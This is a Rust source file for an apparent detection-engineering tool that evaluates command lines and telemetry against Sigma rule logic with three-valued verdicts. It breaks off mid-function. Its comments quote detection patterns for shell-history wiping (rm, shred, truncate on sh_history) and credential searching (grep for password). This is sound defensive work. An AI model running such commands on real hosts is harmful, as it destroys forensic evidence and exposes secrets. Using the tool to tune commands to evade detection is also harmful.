//! Sigma rule-logic evaluator.
//!
//! Evaluates a parsed command against a Sigma rule's actual
//! `detection:`/`condition:` logic, with three-valued (Kleene) logic:
//! `FIRES` / `NO-FIRE` / `INDETERMINATE`. The command is a *command line*, not a
//! full host event, so we synthesize the fields we can legitimately know
//! (`CommandLine`, `Image`, `OriginalFileName`); a rule keyed on a field we
//! cannot see (e.g. `ParentImage`, a hash, a registry value) evaluates to
//! `INDETERMINATE` rather than a false claim. See
//! `docs/design/rule-logic-evaluator.md`.
//!
//! When the input is *recorded* telemetry rather than a command line, the real
//! event carries those extra fields; [`evaluate_observed`] overlays them onto
//! the synthesized base, so a rule keyed on `ParentImage` / `User` /
//! `IntegrityLevel` resolves to `FIRES` / `NO-FIRE` instead of `INDETERMINATE`.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::net::{IpAddr, Ipv4Addr};

use serde::{Deserialize, Serialize};
use serde_norway::Value;

use crate::kb::Platform;
use crate::parser::Command;

/// Kleene three-valued truth.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Ternary {
    True,
    False,
    Unknown,
}

fn and_all<I: IntoIterator<Item = Ternary>>(it: I) -> Ternary {
    let mut unknown = false;
    for t in it {
        match t {
            Ternary::False => return Ternary::False,
            Ternary::Unknown => unknown = true,
            Ternary::True => {}
        }
    }
    if unknown {
        Ternary::Unknown
    } else {
        Ternary::True
    }
}

fn or_all<I: IntoIterator<Item = Ternary>>(it: I) -> Ternary {
    let mut unknown = false;
    for t in it {
        match t {
            Ternary::True => return Ternary::True,
            Ternary::Unknown => unknown = true,
            Ternary::False => {}
        }
    }
    if unknown {
        Ternary::Unknown
    } else {
        Ternary::False
    }
}

fn not_(t: Ternary) -> Ternary {
    match t {
        Ternary::True => Ternary::False,
        Ternary::False => Ternary::True,
        Ternary::Unknown => Ternary::Unknown,
    }
}

/// A value transform: rewrites each authored value into a set of candidate
/// needles *before* any comparison happens. Applied in the order the tokens
/// appear in the field key.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Transform {
    /// `|windash` — the same flag written with any of Windows' dash characters.
    Windash,
    /// `|base64offset` — the value as it appears inside a base64 blob at each
    /// of the three possible byte alignments.
    Base64Offset,
}

impl Transform {
    /// The token as written in the rule, for reporting when the transform
    /// cannot be applied.
    fn token(self) -> &'static str {
        match self {
            Transform::Windash => "windash",
            Transform::Base64Offset => "base64offset",
        }
    }

    /// Expand one value, or `None` when this transform cannot honestly
    /// represent it — see [`base64offset_variants`].
    fn apply(self, value: &str) -> Option<Vec<String>> {
        match self {
            Transform::Windash => Some(windash_variants(value)),
            Transform::Base64Offset => base64offset_variants(value),
        }
    }
}

/// How one candidate needle is compared against the event's field value.
///
/// Separate from [`Transform`] on purpose: `field|contains|windash` is a
/// transform *then* a comparison, and a single flat "which modifier is this"
/// switch cannot express the chain.
#[derive(Debug, Clone, Default)]
enum MatchOp {
    /// Sigma's default: `*` / `?` globbing.
    #[default]
    Glob,
    Contains,
    StartsWith,
    EndsWith,
    /// `|re` — one compiled pattern per authored value, so `|re|all` keeps
    /// meaning "every pattern matches".
    Re(Vec<regex::Regex>),
    /// `|cidr` — the values are networks and the field value is an address.
    Cidr(Vec<Net>),
}

/// A network, widened to IPv6 so one comparison covers v4, v6, and the
/// v4-mapped form. A v4 prefix is shifted by the 96 bits of the mapping, which
/// is also what makes a cross-family comparison come out false rather than
/// accidentally true.
#[derive(Debug, Clone, Copy)]
struct Net {
    bits: u128,
    prefix: u32,
}

/// Widen an address to the v6 space, returning the bit offset a v4 prefix has
/// to be shifted by.
fn to_v6_bits(addr: IpAddr) -> (u128, u32) {
    match addr {
        IpAddr::V4(v4) => (u128::from(v4.to_ipv6_mapped()), 96),
        IpAddr::V6(v6) => (u128::from(v6), 0),
    }
}

impl Net {
    /// Parse `addr/prefix`, or a bare address as a host route.
    ///
    /// Host bits outside the prefix are ignored rather than rejected —
    /// `10.0.0.5/8` is sloppy but unambiguous, and abstaining on it would gain
    /// nothing.
    fn parse(s: &str) -> Option<Net> {
        let s = s.trim();
        let (addr_text, prefix_text) = match s.split_once('/') {
            Some((a, p)) => (a.trim(), Some(p.trim())),
            None => (s, None),
        };
        let addr: IpAddr = addr_text.parse().ok()?;
        let max = if addr.is_ipv4() { 32 } else { 128 };
        let prefix = match prefix_text {
            None => max,
            Some(text) => {
                let n: u32 = text.parse().ok()?;
                if n > max {
                    return None;
                }
                n
            }
        };
        let (bits, shift) = to_v6_bits(addr);
        Some(Net {
            bits,
            prefix: prefix + shift,
        })
    }

    fn contains(&self, addr: IpAddr) -> bool {
        // A zero prefix matches everything, and would shift by 128 otherwise.
        if self.prefix == 0 {
            return true;
        }
        let (bits, _) = to_v6_bits(addr);
        let shift = 128 - self.prefix;
        (self.bits >> shift) == (bits >> shift)
    }
}

/// Read an address out of a sensor field, which may carry a port, brackets, or
/// a scope id alongside it.
///
/// `None` when the value is not an address at all — a hostname proves nothing
/// about whether the connection was inside a network, so the caller abstains.
fn parse_event_ip(value: &str) -> Option<IpAddr> {
    let v = value.trim();
    if let Ok(ip) = v.parse::<IpAddr>() {
        return Some(ip);
    }
    // `[fe80::1]:443`
    if let Some(rest) = v.strip_prefix('[')
        && let Some((host, _)) = rest.split_once(']')
    {
        return host.parse().ok();
    }
    // `10.0.0.1:443` — a single colon cannot be v6, so it is a port.
    if v.matches(':').count() == 1
        && let Some((host, _)) = v.split_once(':')
    {
        return host.parse::<Ipv4Addr>().ok().map(IpAddr::V4);
    }
    // `fe80::1%eth0`
    if let Some((host, _)) = v.split_once('%') {
        return host.parse().ok();
    }
    None
}

/// `re` sub-modifiers that change how the pattern compiles.
#[derive(Debug, Clone, Copy, Default)]
struct ReFlags {
    multi_line: bool,
    dot_all: bool,
}

/// A comparison modifier seen during token walking, before the values it
/// applies to are in hand.
enum PendingOp {
    Contains,
    StartsWith,
    EndsWith,
    Re(ReFlags),
    Cidr,
}

/// Compile a Sigma `re` pattern.
///
/// Case-insensitive, matching every other comparison here, and matching
/// `matcher::Re` on the knowledge-base side. A rule that genuinely needs case
/// can say so with an inline `(?-i)`. The failure direction matters: treating
/// patterns as case-sensitive would turn real firings into `NO-FIRE`, which is
/// the claim this evaluator exists not to make.
///
/// Unanchored, because SigmaHQ writes patterns like `\bnet\s+user\b` and
/// expects a search. Size limits are set because the ruleset is third-party
/// input; the `regex` crate does not backtrack, so the risk is compile-time
/// blowup rather than ReDoS.
fn compile_re(pattern: &str, flags: ReFlags) -> Option<regex::Regex> {
    regex::RegexBuilder::new(pattern)
        .case_insensitive(true)
        .multi_line(flags.multi_line)
        .dot_matches_new_line(flags.dot_all)
        .size_limit(1 << 20)
        .dfa_size_limit(1 << 20)
        .build()
        .ok()
}

/// Turn the comparison modifier seen while walking tokens into the op the
/// evaluator runs, recording the modifier as unevaluated work if it cannot be.
fn resolve_op(
    pending: Option<PendingOp>,
    values: &[String],
    transforms: &[Transform],
    unsupported_mods: &mut Vec<String>,
) -> MatchOp {
    match pending {
        None => MatchOp::Glob,
        Some(PendingOp::Contains) => MatchOp::Contains,
        Some(PendingOp::StartsWith) => MatchOp::StartsWith,
        Some(PendingOp::EndsWith) => MatchOp::EndsWith,
        Some(PendingOp::Re(flags)) => {
            // A compiled pattern is paired with the value it came from, so a
            // value transform underneath `re` has no meaning we can honour.
            if !transforms.is_empty() {
                unsupported_mods.push("re".to_string());
                return MatchOp::Glob;
            }
            let compiled: Option<Vec<regex::Regex>> =
                values.iter().map(|v| compile_re(v, flags)).collect();
            match compiled {
                Some(res) => MatchOp::Re(res),
                // SigmaHQ is upstream input and may use PCRE constructs the
                // `regex` crate has no equivalent for. Abstaining and naming
                // `re` is honest; a silent no-match would read as proof the
                // rule would not fire.
                None => {
                    unsupported_mods.push("re".to_string());
                    MatchOp::Glob
                }
            }
        }
        Some(PendingOp::Cidr) => {
            if !transforms.is_empty() {
                unsupported_mods.push("cidr".to_string());
                return MatchOp::Glob;
            }
            let nets: Option<Vec<Net>> = values.iter().map(|v| Net::parse(v)).collect();
            match nets {
                Some(nets) => MatchOp::Cidr(nets),
                None => {
                    unsupported_mods.push("cidr".to_string());
                    MatchOp::Glob
                }
            }
        }
    }
}

/// A `field|mods: values` match, lowered to the form the evaluator runs on.
///
/// Two distinct things make a match unevaluable, and they are recorded
/// separately so a caller can tell them apart: a modifier we don't implement
/// yet, and an empty value list — Sigma's field-absent (`null`) semantics. Both
/// evaluate to `Unknown`, but only the first is work we could do.
///
/// Any unrecognized token lands in `unsupported_mods`, and [`Self::supported`]
/// then gates the *whole* match to `Unknown`. That is what makes partial
/// modifier support sound: a chain like `wide|base64offset|contains` cannot
/// quietly produce ASCII needles for a UTF-16 rule, because `wide` is unknown
/// and the match abstains as a unit.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(from = "FieldMatchRepr", into = "FieldMatchRepr")]
struct FieldMatch {
    /// The key exactly as written (`CommandLine|contains|windash`), so the
    /// cached form can be re-lowered without loss.
    key: String,
    field: String,
    /// The authored values, as written. `needles` is derived from these.
    values: Vec<String>,
    op: MatchOp,
    /// `|all` — every value group must match, rather than any.
    all: bool,
    /// Compare needles without case folding. Set by `base64offset`, whose
    /// output is case-significant; folding it would match differently-cased
    /// blobs and claim a detection fires when it would not.
    case_sensitive: bool,
    /// One group per authored value: that value's transform expansion. OR
    /// within a group, AND/OR across groups per `all`. Keeping the grouping is
    /// what makes `|all|windash` mean "every authored flag, in any dash form"
    /// rather than "every variant of every flag".
    needles: Vec<Vec<String>>,
    /// Modifier tokens as written in the rule, for the ones we cannot evaluate.
    unsupported_mods: Vec<String>,
    /// `field|…: null` — the rule asserts the field is absent.
    null_values: bool,
}

/// The cached form of a [`FieldMatch`]: the source key and the raw values,
/// nothing derived.
///
/// The lowered form holds things that do not serialize (compiled patterns) and
/// things that are pure functions of these two fields (the needle expansion),
/// so the cache stores the input and re-runs [`lower`] on load. That keeps one
/// code path for degradation — a pattern that will not compile is recorded as
/// an unsupported modifier at load exactly as it is at parse — and means a
/// later fix to a transform's semantics needs no cache-version bump.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct FieldMatchRepr {
    key: String,
    #[serde(default)]
    values: Vec<String>,
}

impl From<FieldMatchRepr> for FieldMatch {
    fn from(r: FieldMatchRepr) -> Self {
        lower(&r.key, r.values)
    }
}

impl From<FieldMatch> for FieldMatchRepr {
    fn from(f: FieldMatch) -> Self {
        FieldMatchRepr {
            key: f.key,
            values: f.values,
        }
    }
}

impl FieldMatch {
    fn supported(&self) -> bool {
        self.unsupported_mods.is_empty() && !self.null_values
    }

    /// A modifier that is implemented but can still abstain at *evaluation*
    /// time, rather than while lowering.
    ///
    /// `cidr` is the case: the values parsed fine, but the event's field may
    /// not be an address at all. Without this the verdict would be
    /// `Indeterminate` with nothing in either cause list — an abstention that
    /// does not say what it is waiting on, which is the thing `Verdict` exists
    /// to avoid. Naming it here keeps to the same over-approximation the other
    /// causes already document.
    fn fallible_mod(&self) -> Option<&'static str> {
        matches!(self.op, MatchOp::Cidr(_)).then_some("cidr")
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum Search {
    Fields(Vec<FieldMatch>),
    OneOfMaps(Vec<Vec<FieldMatch>>),
    /// A bare list of terms matched against the record's text rather than any
    /// named field. `all` is the `|all` modifier: every term must appear, not
    /// merely one.
    Keywords {
        values: Vec<String>,
        all: bool,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum Cond {
    Id(String),
    And(Box<Cond>, Box<Cond>),
    Or(Box<Cond>, Box<Cond>),
    Not(Box<Cond>),
    /// `N of <pattern>` (`n = Some(k)`) or `all of <pattern>` (`n = None`).
    Quant {
        n: Option<usize>,
        pat: String,
    },
}

/// A parsed Sigma rule reduced to what the evaluator needs.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionRule {
    /// The source rule's UUID, carried through so a verdict can be traced back.
    pub id: String,
    /// The source rule's `title:`.
    pub title: String,
    searches: HashMap<String, Search>,
    condition: Cond,
}

/// The verdict of evaluating a rule against a command.
///
/// Three-valued (Kleene), and the third value is the point. A command line is
/// not a host event, so a rule keyed on something the input cannot carry has no
/// answer here — not a negative one.
///
/// **Do not collapse this to a boolean.** [`Indeterminate`](Outcome::Indeterminate)
/// mapped to "not detected" is the single failure mode this evaluator exists to
/// prevent: it converts *"I cannot see enough to say"* into *"nothing would
/// fire"*, which reads as evidence of stealth and is nothing of the kind. If a
/// caller must reduce to two values, the safe direction is to treat
/// `Indeterminate` as unresolved and say so.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Outcome {
    /// The rule's condition is satisfied: it would fire on this input.
    Fires,
    /// The rule's condition is definitively not satisfied on fields the input
    /// does supply. A real negative, not an absence of information.
    NoFire,
    /// The rule could not be decided from this input — it references a field
    /// that could not be synthesized, or a modifier the evaluator does not
    /// implement. See [`Verdict::missing_fields`] and
    /// [`Verdict::blocking_modifiers`] for which.
    Indeterminate,
}

/// An [`Outcome`] together with why it came out that way.
///
/// For an `Indeterminate` outcome the two detail fields are the whole value of
/// the verdict: they name what the input would have to carry for the question
/// to become answerable. Surface them rather than the outcome alone.
#[derive(Debug, Clone)]
pub struct Verdict {
    /// The three-valued result. Read [`Outcome`] before reducing it.
    pub outcome: Outcome,
    /// For `Indeterminate`: referenced fields opseclint cannot synthesize.
    pub missing_fields: Vec<String>,
    /// For `Indeterminate`: referenced fields the event *does* carry, but only
    /// as a stand-in known to its final path segment — see [`Event`].
    ///
    /// Reported apart from `missing_fields` because the two are answered by
    /// different things. A missing field needs telemetry the tool was never
    /// given; a partial one was synthesized, and the rule asked about the part
    /// of it that was invented. Folding them together would report `Image` as
    /// absent when it was present and merely imprecise.
    pub partial_fields: Vec<String>,
    /// For `Indeterminate`: modifier tokens the evaluator does not implement
    /// (`re`, `base64offset`, `windash`, …), sorted and deduplicated.
    ///
    /// This and `missing_fields` are the two *actionable* causes of abstention
    /// and they are very different work: one is evaluator features, the other is
    /// telemetry the tool would have to be given. Reporting them apart is what
    /// makes the indeterminate count diagnosable rather than just large.
    pub blocking_modifiers: Vec<String>,
    /// For `Indeterminate`: the rule asserts a field is absent (`field: null`).
    /// Abstaining is arguably correct here, so this is tracked separately from
    /// the two causes above rather than counted alongside them.
    pub null_value_match: bool,
}

// --- parsing ---------------------------------------------------------------

fn value_to_string(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

/// Drop repeated needles while keeping the order they were generated in, so a
/// value with no expandable position collapses back to a single needle.
fn dedup_in_order(mut items: Vec<String>) -> Vec<String> {
    let mut seen = HashSet::new();
    items.retain(|s| seen.insert(s.clone()));
    items
}

/// Lower a `field|mods` key and its values into the form the evaluator runs on.
///
/// Order-aware: tokens are walked left to right, because some modifiers take
/// trailing sub-modifiers. Anything unrecognized is recorded by name rather
/// than ignored, so `--verify-detections` can report which modifiers are
/// actually costing coverage instead of just that something was unknown.
fn lower(key: &str, values: Vec<String>) -> FieldMatch {
    let mut parts = key.split('|');
    let field = parts.next().unwrap_or("").to_string();
    let tokens: Vec<&str> = parts.collect();

    let mut pending: Option<PendingOp> = None;
    let mut all = false;
    let mut transforms: Vec<Transform> = Vec::new();
    let mut unsupported_mods: Vec<String> = Vec::new();

    let mut i = 0;
    while i < tokens.len() {
        let token = tokens[i];
        let next_op = match token {
            "contains" => Some(PendingOp::Contains),
            "startswith" => Some(PendingOp::StartsWith),
            "endswith" => Some(PendingOp::EndsWith),
            "cidr" => Some(PendingOp::Cidr),
            "re" => {
                // `re` takes trailing sub-modifiers: `|re|i`, `|re|m`, `|re|s`.
                let mut flags = ReFlags::default();
                while let Some(sub) = tokens.get(i + 1) {
                    match *sub {
                        // `i` is redundant — patterns always compile
                        // case-insensitively — but accepting it keeps the
                        // token out of `unsupported_mods`.
                        "i" => {}
                        "m" => flags.multi_line = true,
                        "s" => flags.dot_all = true,
                        _ => break,
                    }
                    i += 1;
                }
                Some(PendingOp::Re(flags))
            }
            _ => None,
        };
        match (token, next_op) {
            // Two comparison modifiers on one field is not a chain we can
            // resolve; abstain rather than let the first or last one win.
            (_, Some(next)) => match pending {
                None => pending = Some(next),
                Some(_) => unsupported_mods.push(token.to_string()),
            },
            ("all", _) => all = true,
            ("windash", _) => transforms.push(Transform::Windash),
            ("base64offset", _) => transforms.push(Transform::Base64Offset),
            (other, _) => unsupported_mods.push(other.to_string()),
        }
        i += 1;
    }

    let op = resolve_op(pending, &values, &transforms, &mut unsupported_mods);
    let null_values = values.is_empty();
    let case_sensitive = transforms.contains(&Transform::Base64Offset);

    // Only expand once every token is understood: a value transform under an
    // unknown modifier would be answering a question we did not parse.
    let mut needles: Vec<Vec<String>> = Vec::new();
    if unsupported_mods.is_empty() {
        'values: for v in &values {
            let mut group = vec![v.clone()];
            for t in &transforms {
                let mut next = Vec::new();
                for s in &group {
                    match t.apply(s) {
                        Some(vs) => next.extend(vs),
                        // The transform cannot represent this value. Record it
                        // as unevaluated work rather than expanding to
                        // something that would answer a different question.
                        None => {
                            unsupported_mods.push(t.token().to_string());
                            needles.clear();
                            break 'values;
                        }
                    }
                }
                group = next;
            }
            needles.push(dedup_in_order(group));
        }
    }

    FieldMatch {
        key: key.to_string(),
        field,
        values,
        op,
        all,
        case_sensitive,
        needles,
        unsupported_mods,
        null_values,
    }
}

fn parse_field_match(key: &str, val: &Value) -> FieldMatch {
    let values: Vec<String> = match val {
        Value::Sequence(seq) => seq.iter().filter_map(value_to_string).collect(),
        other => value_to_string(other).into_iter().collect(),
    };
    lower(key, values)
}

fn parse_fields_map(m: &serde_norway::Mapping) -> Vec<FieldMatch> {
    m.iter()
        .filter_map(|(k, v)| k.as_str().map(|key| parse_field_match(key, v)))
        .collect()
}

/// A keyword list written as a map so it can carry a modifier: the key is bare
/// modifiers with no field name at all, as in
///
/// ```yaml
/// keywords:
///     '|all':
///         - 'grep'
///         - 'password'
/// ```
///
/// Read as an ordinary field match this is a comparison against a field named
/// `""`, which no event carries — so the search abstains, and does so silently,
/// since an empty name is filtered out of the missing-field report. Fourteen
/// SigmaHQ rules are written this way, among them the auditd credential-search
/// rule, and every one of them was answered "I cannot tell" about a question a
/// command line settles outright.
///
/// Only `|all` is recognized. Any other modifier falls through to the field
/// path, where it is reported as unsupported rather than quietly ignored.
fn parse_keyword_map(m: &serde_norway::Mapping) -> Option<Search> {
    if m.len() != 1 {
        return None;
    }
    let (key, val) = m.iter().next()?;
    let key = key.as_str()?;
    let mut tokens = key.split('|');
    if !tokens.next()?.is_empty() {
        return None;
    }
    let tokens: Vec<&str> = tokens.collect();
    if !tokens.iter().all(|t| *t == "all") {
        return None;
    }
    let Value::Sequence(seq) = val else {
        return None;
    };
    Some(Search::Keywords {
        values: seq.iter().filter_map(value_to_string).collect(),
        all: !tokens.is_empty(),
    })
}

fn parse_search(v: &Value) -> Option<Search> {
    match v {
        Value::Mapping(m) => {
            Some(parse_keyword_map(m).unwrap_or_else(|| Search::Fields(parse_fields_map(m))))
        }
        Value::Sequence(seq) => {
            if !seq.is_empty() && seq.iter().all(|x| x.is_mapping()) {
                let groups = seq
                    .iter()
                    .filter_map(|item| item.as_mapping().map(parse_fields_map))
                    .collect();
                Some(Search::OneOfMaps(groups))
            } else {
                Some(Search::Keywords {
                    values: seq.iter().filter_map(value_to_string).collect(),
                    all: false,
                })
            }
        }
        _ => None,
    }
}

/// Parse a Sigma rule (YAML text) into a [`DetectionRule`]. Returns `None` if
/// the rule has no usable `detection`/`condition` (it is then simply skipped by
/// callers rather than mis-evaluated).
pub fn parse_rule(yaml: &str) -> Option<DetectionRule> {
    let doc: Value = serde_norway::from_str(yaml).ok()?;
    parse_rule_value(&doc)
}

/// Parse an already-deserialized Sigma rule document into a [`DetectionRule`].
fn parse_rule_value(doc: &Value) -> Option<DetectionRule> {
    let det = doc.get("detection")?.as_mapping()?;

    let mut searches = HashMap::new();
    let mut condition = None;
    for (k, v) in det {
        let key = k.as_str()?;
        if key == "condition" {
            condition = Some(parse_condition(v.as_str()?)?);
        } else if let Some(s) = parse_search(v) {
            searches.insert(key.to_string(), s);
        }
    }

    Some(DetectionRule {
        id: doc
            .get("id")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string(),
        title: doc
            .get("title")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string(),
        searches,
        condition: condition?,
    })
}

/// One Sigma document, reduced to what the index needs. YAML types stop here.
pub(crate) struct RuleDoc {
    pub id: String,
    pub title: String,
    pub level: String,
    pub category: String,
    pub tags: Vec<String>,
    pub rule: Option<DetectionRule>,
}

/// Split a Sigma file — which may hold several `---`-separated documents — into
/// the documents relevant to `product`. A document is skipped when it fails to
/// parse, declares a different `logsource.product`, or has no `id`/`title`.
///
/// A document that fails to parse is skipped rather than reported. That is a
/// deliberate tolerance for a ruleset we do not control, but it also means a
/// parser that got stricter would quietly shrink the index instead of erroring
/// — which is what the exact fixture counts in `sigma.rs` are there to catch.
///
/// `product` is filtered here rather than by the caller so a rule for another
/// platform is discarded *before* its detection logic is lowered; a Linux index
/// should not pay to parse two thousand Windows detections.
pub(crate) fn parse_documents(content: &str, product: &str) -> Vec<RuleDoc> {
    let mut out = Vec::new();
    for doc in serde_norway::Deserializer::from_str(content) {
        let Ok(value) = Value::deserialize(doc) else {
            continue;
        };
        // Keep platform-relevant rules (matching product or unspecified).
        if let Some(p) = value
            .get("logsource")
            .and_then(|ls| ls.get("product"))
            .and_then(|p| p.as_str())
            && !p.eq_ignore_ascii_case(product)
        {
            continue;
        }
        let (Some(id), Some(title)) = (
            value.get("id").and_then(|v| v.as_str()),
            value.get("title").and_then(|v| v.as_str()),
        ) else {
            continue;
        };
        out.push(RuleDoc {
            id: id.to_string(),
            title: title.to_string(),
            level: value
                .get("level")
                .and_then(|l| l.as_str())
                .unwrap_or("medium")
                .to_string(),
            category: value
                .get("logsource")
                .and_then(|ls| ls.get("category"))
                .and_then(|c| c.as_str())
                .unwrap_or("")
                .to_string(),
            tags: value
                .get("tags")
                .and_then(|t| t.as_sequence())
                .into_iter()
                .flatten()
                .filter_map(|t| t.as_str())
                .map(str::to_string)
                .collect(),
            rule: parse_rule_value(&value),
        });
    }
    out
}

fn parse_condition(s: &str) -> Option<Cond> {
    let spaced = s.replace('(', " ( ").replace(')', " ) ");
    let toks: Vec<String> = spaced.split_whitespace().map(str::to_string).collect();
    let mut p = CondParser { toks, pos: 0 };
    let cond = p.parse_or()?;
    if p.pos == p.toks.len() {
        Some(cond)
    } else {
        None
    }
}

struct CondParser {
    toks: Vec<String>,
    pos: usize,
}

impl CondParser {
    fn peek(&self) -> Option<&str> {
        self.toks.get(self.pos).map(String::as_str)
    }
    fn next(&mut self) -> Option<String> {
        let t = self.toks.get(self.pos).cloned();
        if t.is_some() {
            self.pos += 1;
        }
        t
    }

    fn parse_or(&mut self) -> Option<Cond> {
        let mut left = self.parse_and()?;
        while self.peek() == Some("or") {
            self.next();
            let right = self.parse_and()?;
            left = Cond::Or(Box::new(left), Box::new(right));
        }
        Some(left)
    }

    fn parse_and(&mut self) -> Option<Cond> {
        let mut left = self.parse_not()?;
        while self.peek() == Some("and") {
            self.next();
            let right = self.parse_not()?;
            left = Cond::And(Box::new(left), Box::new(right));
        }
        Some(left)
    }

    fn parse_not(&mut self) -> Option<Cond> {
        if self.peek() == Some("not") {
            self.next();
            Some(Cond::Not(Box::new(self.parse_not()?)))
        } else {
            self.parse_primary()
        }
    }

    fn parse_primary(&mut self) -> Option<Cond> {
        match self.peek()? {
            "(" => {
                self.next();
                let inner = self.parse_or()?;
                if self.next().as_deref() != Some(")") {
                    return None;
                }
                Some(inner)
            }
            "all" => {
                self.next();
                self.parse_quant(None)
            }
            tok if tok.chars().all(|c| c.is_ascii_digit()) => {
                let n: usize = self.next()?.parse().ok()?;
                self.parse_quant(Some(n))
            }
            _ => Some(Cond::Id(self.next()?)),
        }
    }

    fn parse_quant(&mut self, n: Option<usize>) -> Option<Cond> {
        if self.next().as_deref() != Some("of") {
            return None;
        }
        let pat = self.next()?;
        Some(Cond::Quant { n, pat })
    }
}

// --- evaluation ------------------------------------------------------------

/// Simple glob matcher supporting `*` and `?` (inputs pre-lowercased).
fn glob_match(text: &str, pat: &str) -> bool {
    let t: Vec<char> = text.chars().collect();
    let p: Vec<char> = pat.chars().collect();
    let (mut i, mut j) = (0usize, 0usize);
    let (mut star, mut mark) = (None, 0usize);
    while i < t.len() {
        if j < p.len() && (p[j] == '?' || p[j] == t[i]) {
            i += 1;
            j += 1;
        } else if j < p.len() && p[j] == '*' {
            star = Some(j);
            mark = i;
            j += 1;
        } else if let Some(s) = star {
            j = s + 1;
            mark += 1;
            i = mark;
        } else {
            return false;
        }
    }
    while j < p.len() && p[j] == '*' {
        j += 1;
    }
    j == p.len()
}

/// Match one Sigma keyword against a command line.
///
/// A keyword is a *substring* search, not the anchored whole-value comparison a
/// field match performs — but it may still carry `*` and `?`, and upstream
/// authors use them freely. Treating a keyword literally silently kills every
/// such term: SigmaHQ's *Linux Command History Tampering* lists
/// `rm *sh_history`, `shred *sh_history` and `truncate -s0 *sh_history`, and
/// under a literal `contains` none of them could ever match a real command.
///
/// Anchoring the pattern with `*` on both ends is what turns the whole-value
/// [`glob_match`] into the substring search a keyword wants, so the two agree on
/// wildcard semantics rather than each inventing their own. Keywords without a
/// wildcard — the common case — keep the cheap `contains` path, which the glob
/// would only reproduce more slowly.
fn keyword_match(haystack: &str, keyword: &str) -> bool {
    if keyword.contains(['*', '?']) {
        glob_match(haystack, &format!("*{keyword}*"))
    } else {
        haystack.contains(keyword)
    }
}

/// The event a rule is evaluated against: the fields themselves, plus which of
/// them are known only *partially*.
///
/// A synthesized `Image` is a stand-in. A command line names the program but
/// not where it lives, so the value is `/{basename}` — enough for the
/// `|endswith: '/curl'` form real rules are written in. Compared as if it were
/// the whole truth it also makes `Image: '/usr/sbin/screencapture'` a definite
/// *false*, which reads as "the ruleset refutes this claim" when what happened
/// is that the directory was never known. Marking such a field partial is what
/// lets [`eval_field`] tell a refusal apart from an abstention.
///
/// Only synthesized events carry partial fields. A real recorded value is
/// exact, so overlaying one clears the marking — which is precisely why
/// observed mode resolves verdicts predictive mode cannot.
pub struct Event<'a> {
    fields: Cow<'a, HashMap<String, String>>,
    /// Fields whose value is known only as far as its final path segment.
    /// Borrowed names: every partial field is one this module synthesizes, so
    /// the set never holds a string the caller supplied.
    partial: HashSet<&'static str>,
}

impl<'a> Event<'a> {
    /// An event every field of which is exactly what a sensor recorded.
    /// Borrows: nothing here needs to be owned or modified.
    pub fn known(fields: &'a HashMap<String, String>) -> Self {
        Event {
            fields: Cow::Borrowed(fields),
            partial: HashSet::new(),
        }
    }

    fn get(&self, field: &str) -> Option<&String> {
        self.fields.get(field)
    }

    fn contains_key(&self, field: &str) -> bool {
        self.fields.contains_key(field)
    }

    fn is_partial(&self, field: &str) -> bool {
        self.partial.contains(field)
    }

    /// Overlay a value a sensor actually reported. The field stops being
    /// partial: whatever stand-in was there has been replaced by the real
    /// thing.
    fn observe(&mut self, field: &str, value: &str) {
        self.fields
            .to_mut()
            .insert(field.to_string(), value.to_string());
        self.partial.remove(field);
    }
}

fn synthesize(cmd: &Command, platform: Platform) -> Event<'static> {
    let mut m = HashMap::new();
    m.insert("CommandLine".to_string(), cmd.raw.clone());
    let image = match platform {
        Platform::WindowsSysmon => format!("\\{}.exe", cmd.program),
        _ => format!("/{}", cmd.program),
    };
    m.insert("Image".to_string(), image);
    m.insert("OriginalFileName".to_string(), cmd.program.clone());
    Event {
        fields: Cow::Owned(m),
        partial: HashSet::from(["Image"]),
    }
}

/// The records one auditd event is made of, synthesized from a command line.
///
/// auditd does not log an event; it logs several *records* — a `SYSCALL`, an
/// `EXECVE`, a `PATH` per file touched — and a Sigma rule's search terms all
/// describe one of them. `type: 'EXECVE'` with `a0` and `type: 'PATH'` with
/// `name` are two different records, so flattening them into one event would
/// invent a record that carries an `a0` *and* a `name` and reads `type` as
/// whichever we picked. Each is built separately and asked separately instead.
///
/// Three fields a real record carries are deliberately absent, because a
/// command line does not imply them and a synthesized value would refute rules
/// that are in fact satisfied:
///
/// * `exe` is the *resolved* executable. `insmod` is a symlink to
///   `/usr/bin/kmod`, so the difference is not the directory but the basename —
///   the partial-path machinery cannot express it, and SigmaHQ's insmod rule
///   keys on exactly that. Unknown is the honest answer.
/// * `SYSCALL` names one syscall out of the many a process makes. An exec
///   implies `execve` and nothing else; a rule keyed `SYSCALL: 'sysinfo'` is
///   asking about a call `ps` really does make and we simply did not record.
/// * `key` is the tag on the site's own audit rule, which is a property of the
///   host's configuration rather than of the action.
fn auditd_records(cmd: &Command, files: &[&str]) -> Vec<Event<'static>> {
    let mut records = Vec::new();

    // EXECVE: the argument vector as auditd splits it. `a0` is argv[0], which
    // may be typed as a bare name or an absolute path — partial for the same
    // reason `Image` is. `a1…aN` are the arguments verbatim, so they are exact.
    //
    // `CommandLine` rides along because auditd rules mix `type: 'EXECVE'` with
    // a keyword list, and a keyword search over an auditd record is a search
    // over its text — which is the argument vector. Without it a rule like
    // SigmaHQ's "Credentials In Files" would abstain on the half of itself that
    // a command line answers completely.
    let mut execve = HashMap::new();
    execve.insert("type".to_string(), "EXECVE".to_string());
    execve.insert("a0".to_string(), cmd.program.clone());
    for (i, arg) in cmd.args.iter().enumerate() {
        execve.insert(format!("a{}", i + 1), arg.clone());
    }
    execve.insert("CommandLine".to_string(), cmd.raw.clone());
    records.push(Event {
        fields: Cow::Owned(execve),
        partial: HashSet::from(["a0"]),
    });

